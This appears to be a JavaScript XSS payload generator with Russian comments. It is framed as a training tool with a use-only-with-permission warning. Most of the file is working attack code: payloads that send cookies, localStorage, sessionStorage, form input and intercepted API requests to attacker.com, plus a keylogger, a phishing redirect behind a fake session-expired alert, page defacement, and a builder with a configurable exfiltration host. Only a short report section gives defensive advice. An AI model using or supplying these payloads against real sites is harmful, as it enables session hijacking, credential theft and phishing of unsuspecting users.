/**
 * ГЕНЕРАТОР XSS PAYLOAD
 * 
 * Этот инструмент создает XSS payload для демонстрации уязвимостей
 * в контролируемой среде обучения.
 * 
 * ⚠️ ВНИМАНИЕ: Используйте только на системах, которыми вы владеете
 * или имеете явное разрешение на тестирование.
 */

class XSSPayloadGenerator {
    constructor() {
        this.payloads = {
            basic: [],
            advanced: [],
            dataExtraction: [],
            demonstration: []
        };
        
        this.initializePayloads();
    }

    /**
     * ИНИЦИАЛИЗАЦИЯ PAYLOAD
     */
    initializePayloads() {
        // Базовые XSS payload
        this.payloads.basic = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<input autofocus onfocus=alert("XSS")>'
        ];

        // Продвинутые payload
        this.payloads.advanced = [
            '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
            '<img src=x onerror="fetch(\'https://attacker.com/steal?data=\'+encodeURIComponent(document.cookie))">',
            '<svg onload="new Image().src=\'https://attacker.com/steal?data=\'+btoa(document.cookie)">',
            '<script>navigator.sendBeacon("https://attacker.com/steal",document.cookie)</script>'
        ];

        // Payload для извлечения данных
        this.payloads.dataExtraction = [
            this.createDataExtractionPayload(),
            this.createLocalStorageExtractionPayload(),
            this.createFormDataExtractionPayload(),
            this.createAPIExtractionPayload()
        ];

        // Демонстрационные payload
        this.payloads.demonstration = [
            this.createDemonstrationPayload(),
            this.createKeyloggerPayload(),
            this.createRedirectPayload(),
            this.createDefacementPayload()
        ];
    }

    /**
     * СОЗДАНИЕ PAYLOAD ДЛЯ ИЗВЛЕЧЕНИЯ ДАННЫХ
     */
    createDataExtractionPayload() {
        return `
<script>
(function() {
    // Извлечение всех данных из браузера
    const data = {
        url: window.location.href,
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        forms: [],
        timestamp: new Date().toISOString()
    };
    
    // Извлечение localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.localStorage[key] = localStorage.getItem(key);
    }
    
    // Извлечение sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    // Извлечение данных форм
    const forms = document.querySelectorAll('form');
    forms.forEach((form, index) => {
        const formData = {
            action: form.action,
            method: form.method,
            inputs: {}
        };
        
        const inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(input => {
            const key = input.name || input.id || 'input_' + index;
            formData.inputs[key] = {
                type: input.type,
                value: input.value,
                placeholder: input.placeholder
            };
        });
        
        data.forms.push(formData);
    });
    
    // Отправка данных
    fetch('https://attacker.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
})();
</script>
        `.trim();
    }

    /**
     * СОЗДАНИЕ PAYLOAD ДЛЯ ИЗВЛЕЧЕНИЯ LOCALSTORAGE
     */
    createLocalStorageExtractionPayload() {
        return `
<script>
(function() {
    const storageData = {};
    
    // Извлечение localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        storageData[key] = localStorage.getItem(key);
    }
    
    // Отправка через beacon API
    navigator.sendBeacon(
        'https://attacker.com/steal-storage',
        JSON.stringify(storageData)
    );
})();
</script>
        `.trim();
    }

    /**
     * СОЗДАНИЕ PAYLOAD ДЛЯ ИЗВЛЕЧЕНИЯ ДАННЫХ ФОРМ
     */
    createFormDataExtractionPayload() {
        return `
<script>
(function() {
    // Перехват отправки форм
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // Отправка данных формы
            fetch('https://attacker.com/steal-form', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        });
    });
    
    // Перехват input событий
    const inputs = document.querySelectorAll('input, textarea');
    inputs.forEach(input => {
        input.addEventListener('input', function(e) {
            const data = {
                field: input.name || input.id,
                value: input.value,
                type: input.type,
                timestamp: new Date().toISOString()
            };
            
            fetch('https://attacker.com/steal-input', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        });
    });
})();
</script>
        `.trim();
    }

    /**
     * СОЗДАНИЕ PAYLOAD ДЛЯ ПЕРЕХВАТА API ЗАПРОСОВ
     */
    createAPIExtractionPayload() {
        return `
<script>
(function() {
    // Перехват fetch
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        const options = args[1] || {};
        
        const requestData = {
            url: url,
            method: options.method || 'GET',
            headers: options.headers,
            body: options.body,
            timestamp: new Date().toISOString()
        };
        
        // Отправка данных запроса
        fetch('https://attacker.com/steal-api', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(requestData)
        });
        
        return originalFetch.apply(this, args);
    };
    
    // Перехват XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        const requestData = {
            method: method,
            url: url,
            timestamp: new Date().toISOString()
        };
        
        fetch('https://attacker.com/steal-xhr', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(requestData)
        });
        
        return originalXHROpen.apply(this, [method, url, ...args]);
    };
})();
</script>
        `.trim();
    }

    /**
     * СОЗДАНИЕ ДЕМОНСТРАЦИОННОГО PAYLOAD
     */
    createDemonstrationPayload() {
        return `
<script>
(function() {
    // Создание уведомления
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #ff4444;
        color: white;
        padding: 15px;
        border-radius: 5px;
        z-index: 9999;
        font-family: Arial, sans-serif;
        box-shadow: 0 4px 8px rgba(0,0,0,0.3);
    `;
    notification.innerHTML = '<strong>⚠️ ВНИМАНИЕ!</strong><br>Обнаружена уязвимость XSS';
    
    document.body.appendChild(notification);
    
    // Удаление через 5 секунд
    setTimeout(() => {
        notification.remove();
    }, 5000);
    
    // Логирование в консоль
    console.log('🔒 ДЕМОНСТРАЦИЯ XSS УЯЗВИМОСТИ');
    console.log('Этот payload показывает, что злоумышленник может:');
    console.log('1. Выполнять произвольный JavaScript код');
    console.log('2. Извлекать данные из браузера');
    console.log('3. Перехватывать пользовательский ввод');
    console.log('4. Отправлять данные на внешние серверы');
})();
</script>
        `.trim();
    }

    /**
     * СОЗДАНИЕ KEYLOGGER PAYLOAD
     */
    createKeyloggerPayload() {
        return `
<script>
(function() {
    let keystrokes = '';
    
    // Перехват нажатий клавиш
    document.addEventListener('keydown', function(e) {
        keystrokes += e.key;
        
        // Отправка каждые 10 символов
        if (keystrokes.length >= 10) {
            fetch('https://attacker.com/steal-keys', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    keystrokes: keystrokes,
                    timestamp: new Date().toISOString()
                })
            });
            keystrokes = '';
        }
    });
    
    // Отправка при потере фокуса
    document.addEventListener('blur', function() {
        if (keystrokes.length > 0) {
            fetch('https://attacker.com/steal-keys', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    keystrokes: keystrokes,
                    timestamp: new Date().toISOString()
                })
            });
            keystrokes = '';
        }
    });
})();
</script>
        `.trim();
    }

    /**
     * СОЗДАНИЕ REDIRECT PAYLOAD
     */
    createRedirectPayload() {
        return `
<script>
(function() {
    // Перенаправление на фишинговую страницу
    setTimeout(() => {
        window.location.href = 'https://attacker.com/phishing-page';
    }, 3000);
    
    // Показ предупреждения
    alert('Ваша сессия истекла. Вы будете перенаправлены на страницу входа.');
})();
</script>
        `.trim();
    }

    /**
     * СОЗДАНИЕ DEFACEMENT PAYLOAD
     */
    createDefacementPayload() {
        return `
<script>
(function() {
    // Изменение содержимого страницы
    document.body.innerHTML = `
        <div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;">
            <h1 style="color: #ff4444;">⚠️ СИСТЕМА ВЗЛОМАНА ⚠️</h1>
            <p>Эта страница была скомпрометирована через XSS уязвимость.</p>
            <p>Демонстрация уязвимости безопасности.</p>
            <hr>
            <p><small>Это демонстрационный payload для обучения безопасности.</small></p>
        </div>
    `;
    
    // Изменение заголовка
    document.title = '⚠️ СИСТЕМА ВЗЛОМАНА ⚠️';
})();
</script>
        `.trim();
    }

    /**
     * ПОЛУЧЕНИЕ ВСЕХ PAYLOAD
     */
    getAllPayloads() {
        return {
            basic: this.payloads.basic,
            advanced: this.payloads.advanced,
            dataExtraction: this.payloads.dataExtraction,
            demonstration: this.payloads.demonstration
        };
    }

    /**
     * ПОЛУЧЕНИЕ PAYLOAD ПО КАТЕГОРИИ
     */
    getPayloadsByCategory(category) {
        return this.payloads[category] || [];
    }

    /**
     * СОЗДАНИЕ КАСТОМНОГО PAYLOAD
     */
    createCustomPayload(options = {}) {
        const {
            action = 'alert',
            message = 'XSS',
            dataExtraction = false,
            keylogger = false,
            redirect = false,
            targetUrl = 'https://attacker.com'
        } = options;

        let payload = '<script>\n(function() {\n';
        
        if (action === 'alert') {
            payload += `    alert("${message}");\n`;
        } else if (action === 'console') {
            payload += `    console.log("${message}");\n`;
        } else if (action === 'notification') {
            payload += `
    const notification = document.createElement('div');
    notification.style.cssText = 'position: fixed; top: 20px; right: 20px; background: #ff4444; color: white; padding: 15px; border-radius: 5px; z-index: 9999;';
    notification.innerHTML = '${message}';
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 5000);
            `;
        }
        
        if (dataExtraction) {
            payload += `
    // Извлечение данных
    const data = {
        url: window.location.href,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    fetch('${targetUrl}/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
            `;
        }
        
        if (keylogger) {
            payload += `
    // Keylogger
    let keystrokes = '';
    document.addEventListener('keydown', function(e) {
        keystrokes += e.key;
        if (keystrokes.length >= 10) {
            fetch('${targetUrl}/keys', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({keystrokes: keystrokes})
            });
            keystrokes = '';
        }
    });
            `;
        }
        
        if (redirect) {
            payload += `
    // Перенаправление
    setTimeout(() => {
        window.location.href = '${targetUrl}';
    }, 3000);
            `;
        }
        
        payload += '})();\n</script>';
        
        return payload;
    }

    /**
     * ТЕСТИРОВАНИЕ PAYLOAD
     */
    testPayload(payload, targetElement = null) {
        console.log("🧪 ТЕСТИРОВАНИЕ XSS PAYLOAD");
        console.log("Payload:", payload);
        
        if (targetElement) {
            targetElement.innerHTML = payload;
        } else {
            // Создание тестового элемента
            const testDiv = document.createElement('div');
            testDiv.style.display = 'none';
            testDiv.innerHTML = payload;
            document.body.appendChild(testDiv);
            
            // Удаление через 1 секунду
            setTimeout(() => {
                testDiv.remove();
            }, 1000);
        }
    }

    /**
     * ГЕНЕРАЦИЯ ОТЧЕТА ПО PAYLOAD
     */
    generatePayloadReport() {
        console.log("\n📊 ОТЧЕТ ПО XSS PAYLOAD");
        
        const report = {
            summary: {
                totalPayloads: Object.values(this.payloads).flat().length,
                categories: Object.keys(this.payloads).length,
                timestamp: new Date().toISOString()
            },
            categories: {
                basic: {
                    count: this.payloads.basic.length,
                    description: 'Базовые XSS payload для демонстрации'
                },
                advanced: {
                    count: this.payloads.advanced.length,
                    description: 'Продвинутые payload с извлечением данных'
                },
                dataExtraction: {
                    count: this.payloads.dataExtraction.length,
                    description: 'Payload для извлечения данных из браузера'
                },
                demonstration: {
                    count: this.payloads.demonstration.length,
                    description: 'Демонстрационные payload для обучения'
                }
            },
            recommendations: [
                {
                    priority: 'CRITICAL',
                    title: 'Защита от XSS',
                    description: 'Внедрите меры защиты от XSS атак',
                    actions: [
                        'Валидируйте и санитизируйте все пользовательские данные',
                        'Используйте Content Security Policy (CSP)',
                        'Применяйте HttpOnly cookies',
                        'Используйте современные фреймворки с встроенной защитой'
                    ]
                }
            ]
        };
        
        console.log("📋 СВОДКА PAYLOAD:");
        console.log(`  Всего payload: ${report.summary.totalPayloads}`);
        console.log(`  Категорий: ${report.summary.categories}`);
        
        Object.entries(report.categories).forEach(([category, info]) => {
            console.log(`  ${category}: ${info.count} payload - ${info.description}`);
        });
        
        return report;
    }
}

// Экспорт для использования
if (typeof module !== 'undefined' && module.exports) {
    module.exports = XSSPayloadGenerator;
} else if (typeof window !== 'undefined') {
    window.XSSPayloadGenerator = XSSPayloadGenerator;
}

// Пример использования
if (typeof window !== 'undefined') {
    console.log("🎯 XSS PAYLOAD ГЕНЕРАТОР ЗАГРУЖЕН");
    console.log("Используйте: new XSSPayloadGenerator().getAllPayloads()");
}
